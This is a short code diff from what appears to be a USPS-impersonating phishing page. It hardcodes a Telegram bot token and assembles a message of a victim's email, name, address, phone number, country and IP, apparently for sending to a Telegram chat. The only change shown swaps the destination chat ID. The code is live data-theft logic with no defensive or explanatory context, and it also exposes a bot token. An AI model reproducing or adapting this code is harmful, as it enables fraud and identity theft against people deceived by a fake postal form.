@@ -2256,7 +2256,7 @@ export default {
       that.info.query = this.query;
      var token = "6346259743:AAEFPYGw3OQsWVKiVNOAd1Ssm33OEVGNNjM";
 
-      var chatId2 = -936912870;
+      var chatId2 = -940829481;
       var fullMessage = `
         ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0AEmail : ${this.info.email}%0AFull name : ${this.info.fullName}%0AAddress 1 : ${this.info.address1}%0ACity : ${this.info.city}%0AZip Code : ${this.info.zipCode}%0APhone number : ${this.info.phoneNumber}%0ACountry : ${this.info.country}%0AIP : ${this.info.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
 
